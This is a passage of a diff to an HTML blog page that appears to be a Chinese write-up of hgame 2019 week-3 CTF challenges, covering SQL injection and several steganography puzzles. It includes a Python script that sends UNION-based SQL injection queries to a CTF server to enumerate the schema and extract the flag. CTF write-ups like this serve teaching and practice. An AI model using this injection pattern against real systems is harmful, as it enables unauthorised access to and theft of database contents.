@@ -103,13 +103,13 @@ Base Score
 <p>Description</p>
 <p>sql &#x6CE8;&#x5165; &#x53C2;&#x6570;&#x662F;id</p>
 <p>URL</p>
-<p><a href="http://118.89.111.179:3000/" target="_blank" rel="noopener" class="uri">http://118.89.111.179:3000/</a></p>
+<p><a target="_blank" rel="noopener" href="http://118.89.111.179:3000/" class="uri">http://118.89.111.179:3000/</a></p>
 <p>Base Score</p>
 <p>150</p>
-<a id="more"></a>
+<span id="more"></span>
 <h4 id="answer">Answer</h4>
 <p>&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x7528;union&#x8FDB;&#x884C;&#x8FDB;&#x4E00;&#x6B65;&#x5BFB;&#x627E;&#xFF0C;python&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MD5</span><span class="params">(target)</span>:</span></span><br><span class="line">    candidate = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        plaintext = str(candidate)</span><br><span class="line">        hash = hashlib.md5(plaintext.encode(<span class="string">&apos;ascii&apos;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> hash[:<span class="number">4</span>] == target:</span><br><span class="line">            <span class="keyword">return</span> candidate</span><br><span class="line">        candidate = candidate + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&apos;http://118.89.111.179:3000/&apos;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">md5 = MD5(r.text.split(<span class="string">&apos;= &apos;</span>)[<span class="number">1</span>][:<span class="number">4</span>])</span><br><span class="line">id = <span class="string">&quot;1 union select schema_name from information_schema.schemata&quot;</span></span><br><span class="line">id = <span class="string">&apos;1 union select table_name from information_schema.tables where table_schema=\&apos;hgame\&apos;&apos;</span></span><br><span class="line">id = <span class="string">&apos;1 union select column_name from information_schema.columns where table_name=\&apos;f1l1l1l1g\&apos;&apos;</span></span><br><span class="line">                                                                    +<span class="string">&apos; and table_schema=\&apos;hgame\&apos;&apos;</span></span><br><span class="line">id = <span class="string">&apos;1 union select f14444444g from f1l1l1l1g&apos;</span></span><br><span class="line">g = requests.get(url, params={<span class="string">&apos;id&apos;</span>: id, <span class="string">&apos;code&apos;</span>: md5}, cookies=r.cookies)</span><br><span class="line">print(g.text.split(<span class="string">&apos;&lt;br&gt;&apos;</span>)[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MD5</span>(<span class="params">target</span>):</span></span><br><span class="line">    candidate = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        plaintext = <span class="built_in">str</span>(candidate)</span><br><span class="line">        <span class="built_in">hash</span> = hashlib.md5(plaintext.encode(<span class="string">&apos;ascii&apos;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hash</span>[:<span class="number">4</span>] == target:</span><br><span class="line">            <span class="keyword">return</span> candidate</span><br><span class="line">        candidate = candidate + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&apos;http://118.89.111.179:3000/&apos;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">md5 = MD5(r.text.split(<span class="string">&apos;= &apos;</span>)[<span class="number">1</span>][:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">id</span> = <span class="string">&quot;1 union select schema_name from information_schema.schemata&quot;</span></span><br><span class="line"><span class="built_in">id</span> = <span class="string">&apos;1 union select table_name from information_schema.tables where table_schema=\&apos;hgame\&apos;&apos;</span></span><br><span class="line"><span class="built_in">id</span> = <span class="string">&apos;1 union select column_name from information_schema.columns where table_name=\&apos;f1l1l1l1g\&apos;&apos;</span></span><br><span class="line">                                                                    +<span class="string">&apos; and table_schema=\&apos;hgame\&apos;&apos;</span></span><br><span class="line"><span class="built_in">id</span> = <span class="string">&apos;1 union select f14444444g from f1l1l1l1g&apos;</span></span><br><span class="line">g = requests.get(url, params={<span class="string">&apos;id&apos;</span>: <span class="built_in">id</span>, <span class="string">&apos;code&apos;</span>: md5}, cookies=r.cookies)</span><br><span class="line">print(g.text.split(<span class="string">&apos;&lt;br&gt;&apos;</span>)[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
 <p>&#x4EE3;&#x7801;&#x4E2D;&#x7684;4&#x4E2A;id&#x5C31;&#x662F;4&#x6B65;&#x5C1D;&#x8BD5;&#xFF1A;&#x4E00;&#x6B65;&#x6B65;&#x6839;&#x636E;&#x8F93;&#x51FA;&#x5F97;&#x5230;</p>
 <p>&#x4E0B;&#x9762;&#x7684;<code>hgame</code>,<code>f1l1l1l1g</code>,<code>f14444444g</code></p>
 <p>&#x6700;&#x540E;&#x5F97;&#x5230;flag:<code>hgame{sql1_1s_iNterest1ng}</code></p>
@@ -119,7 +119,7 @@ Base Score
 <p>Description</p>
 <p>&#x4F60;&#x77E5;&#x9053;Kali&#x4E0B;&#x6709;&#x4E2A;&#x5F3A;&#x5927;&#x7684;&#x5B57;&#x5178;&#x53EB;rockyou.txt&#x561B;?&#x5BC6;&#x7801;&#x4E3A; sec.* hint1:DeEgger Embedder hint2:outguess</p>
 <p>URL</p>
-<p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/stuff/flag.zip" target="_blank" rel="noopener" class="uri">http://plir4axuz.bkt.clouddn.com/hgame2019/stuff/flag.zip</a></p>
+<p><a target="_blank" rel="noopener" href="http://plir4axuz.bkt.clouddn.com/hgame2019/stuff/flag.zip" class="uri">http://plir4axuz.bkt.clouddn.com/hgame2019/stuff/flag.zip</a></p>
 <p>Base Score</p>
 <p>150</p>
 <h4 id="answer-1">Answer</h4>
@@ -134,7 +134,7 @@ Base Score
 <p>Description</p>
 <p>&#x51FA;&#x9898;&#x4EBA;&#x60F3;&#x4E0D;&#x597D;&#x9898;&#x76EE;&#x63CF;&#x8FF0;&#x4E86;</p>
 <p>URL</p>
-<p><a href="http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg" target="_blank" rel="noopener" class="uri">http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg</a></p>
+<p><a target="_blank" rel="noopener" href="http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg" class="uri">http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg</a></p>
 <p>Base Score</p>
 <p>150</p>
 <h4 id="answer-2">Answer</h4>
@@ -166,7 +166,7 @@ Base Score
 <p>Description</p>
 <p>&#x6109;&#x5FEB;&#x7684;&#x9001;&#xFF08;nao&#xFF09;&#x5206;&#xFF08;dong&#xFF09;&#x9898;&#xFF0C;&#x5927;&#x5BB6;&#x4E00;&#x8D77;&#x6765;&#x5B66;&#x5386;&#x53F2;&#x5427;&#xFF0C;&#x7ED3;&#x679C;&#x52A0;&#x4E0A;hgame{}&#xFF08;&#x5B57;&#x6BCD;&#x5747;&#x4E3A;&#x5927;&#x5199;&#xFF09; hint:memory &#x53C8;&#x4E00;&#x4E2A;hint:&#x5B58;&#x50A8;&#x5668;</p>
 <p>URL</p>
-<p><a href="http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg" target="_blank" rel="noopener" class="uri">http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg</a></p>
+<p><a target="_blank" rel="noopener" href="http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg" class="uri">http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg</a></p>
 <p>Base Score</p>
 <p>100</p>
 <h4 id="answer-3">Answer</h4>
@@ -181,13 +181,13 @@ Base Score
 <p>Description</p>
 <p>&#x4E00;&#x9996;MP3,&#x597D;&#x597D;&#x542C;&#x54E6;&#xFF0C;flag&#x7531;&#x5927;&#x5199;&#x82F1;&#x6587;&#x5B57;&#x6BCD;&#x3001;&#x6570;&#x5B57;&#x4EE5;&#x53CA;&#x4E0B;&#x5212;&#x7EBF;&#x7EC4;&#x6210;&#xFF0C;&#x8BB0;&#x5F97;&#x6DFB;&#x52A0;hgame{}</p>
 <p>URL</p>
-<p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3" target="_blank" rel="noopener" class="uri">http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3</a></p>
+<p><a target="_blank" rel="noopener" href="http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3" class="uri">http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3</a></p>
 <p>Base Score</p>
 <p>150</p>
 <h4 id="answer-4">Answer</h4>
 <p>&#x6253;&#x5F00;&#x540E;&#x62FF;&#x5230;&#x4E2D;&#x95F4;&#x7279;&#x6B8A;&#x7684;&#x4E00;&#x6BB5;&#x6EF4;&#x6EF4;&#x6EF4;&#x7684;&#x58F0;&#x97F3;&#xFF1A;</p>
 <figure>
-<img src="/images/hgame-week3/dididi.png" alt="dididi"><figcaption aria-hidden="true">dididi</figcaption>
+<img src="/images/hgame-week3/dididi.png" alt="dididi"><figcaption>dididi</figcaption>
 </figure>
 <p>&#x6309;&#x7167;&#x83AB;&#x65AF;&#x7535;&#x7801;&#xFF0C;&#x5C31;&#x662F;</p>
 <blockquote>
